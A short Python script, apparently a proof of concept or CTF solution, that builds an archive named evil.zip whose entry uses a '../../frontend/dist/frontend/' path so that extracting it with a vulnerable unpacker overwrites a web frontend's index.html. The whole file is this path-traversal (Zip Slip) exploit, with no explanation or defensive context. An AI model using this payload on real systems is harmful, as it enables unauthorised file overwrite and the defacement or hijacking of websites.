import zipfile

FILENAME = "index.html"

def main():
    zf = zipfile.ZipFile("evil.zip", "w")
    zf.write(FILENAME, f'../../frontend/dist/frontend/' + FILENAME)
    zf.close()

if __name__ == '__main__':
     main()
